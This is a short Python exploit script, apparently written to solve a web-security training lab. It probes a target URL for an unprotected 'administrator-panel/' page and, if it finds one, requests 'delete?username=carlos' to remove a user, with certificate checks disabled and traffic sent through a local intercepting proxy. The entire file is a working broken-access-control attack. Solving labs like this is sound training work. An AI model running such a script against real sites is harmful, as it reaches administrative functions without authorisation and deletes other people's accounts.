import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"https": "http://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}


def exploit(url):

    response = requests.get(url + 'administrator-panel/',
                            verify=False, proxies=proxies)

    if response.status_code == 200:
        print("(+) Found admin panel at: \n{}administrator-panel".format(url))
        url = url + 'administrator-panel/'
        delete_carlos(url)
    else:
        print("(-) Unable to find admin panel...")


def delete_carlos(url):
    print("(+) Deleting user carlos...")
    reponse = requests.get(url+'delete?username=carlos',
                           verify=False, proxies=proxies)

    if reponse.status_code == 200:
        print("(+) Carlos user deleted successfully!")
    else:
        print("(-) Unable to delete Carlos user...Something went wrong!")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://www.example.com" % sys.argv[0])
    else:
        url = sys.argv[1]
        exploit(url)


if __name__ == "__main__":
    main()
